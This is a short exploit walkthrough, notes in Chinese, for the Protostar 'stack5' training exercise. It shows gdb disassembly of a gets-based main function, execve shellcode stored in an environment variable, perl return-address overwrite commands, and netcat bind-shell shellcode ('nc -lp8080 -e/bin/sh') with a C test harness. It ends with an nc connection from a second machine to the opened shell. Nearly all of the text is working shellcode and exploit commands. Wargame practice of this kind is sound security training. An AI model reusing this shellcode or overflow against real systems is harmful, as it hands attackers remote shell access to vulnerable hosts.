(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave  
0x080483da <main+22>:   ret    
End of assembler dump.
(gdb) 

STDIN 的exploit不能spawn shell，会自动退出，例如：
user@protostar:/opt/protostar/bin$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
user@protostar:~$ ./getenv PAYLOAD
PAYLOAD is at 0xbfffffc5
user@protostar:/opt/protostar/bin$ perl -e 'print"A"x(76)."\xc5\xff\xff\xbf"' | ./stack5    
user@protostar:/opt/protostar/bin$ 

利用netcat shellcode
//bin/nc -lp8080 -e/bin/sh
char shellcode[] =
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e"
"\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80"
"\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d"
"\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";
 
int main()
{
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
}

user@protostar:/opt/protostar/bin$ export PAYLOAD=$'\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23'
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ cd ~
user@protostar:~$ ./getenv PAYLOAD
PAYLOAD is at 0xbfffff9c
user@protostar:/opt/protostar/bin$ perl -e 'print"A"x(76)."\x9c\xff\xff\xbf"' | ./stack5  

在另外的机器上连接它:
fusion@fusion:~$ nc 192.168.216.147 8080
